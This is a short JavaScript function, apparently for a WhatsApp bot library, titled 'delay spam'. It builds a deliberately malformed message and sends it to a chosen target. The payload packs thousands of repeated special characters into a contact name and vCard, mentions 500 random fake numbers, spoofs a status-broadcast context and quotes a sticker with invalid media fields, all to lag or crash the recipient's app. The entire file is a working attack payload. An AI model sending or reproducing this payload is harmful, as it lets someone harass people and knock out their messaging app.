async function delayspam(amelia, target) {
  let ameliamsg = {
    viewOnceMessage: {
      message: {
        requestPhoneNumberMessage: {
          contact: {
            displayName: "ꦾ".repeat(5000),
            vcard:
              "BEGIN:VCARD\nFN:" +
              "ꦾ".repeat(10000) +
              "\nEND:VCARD",
          },
          contextInfo: {
            stanzaId: "BUG-" + Date.now(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 500 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 9999999) +
                  "@s.whatsapp.net"
              ),
            ],
            quotedMessage: {
              stickerMessage: {
                mimetype: "image/webp",
                isAnimated: true,
                fileSha256: Buffer.alloc(64),
                mediaKey: Buffer.alloc(32),
                height: 99999,
                width: 99999,
                directPath: "/invalidpath",
                mediaKeyTimestamp: 99999999,
              },
            },
          },
        },
      },
    },
  };

  await amelia.relayMessage(target, ameliamsg, {
    participant: { jid: target },
    messageId: null,
  });
}
DELAY SPAM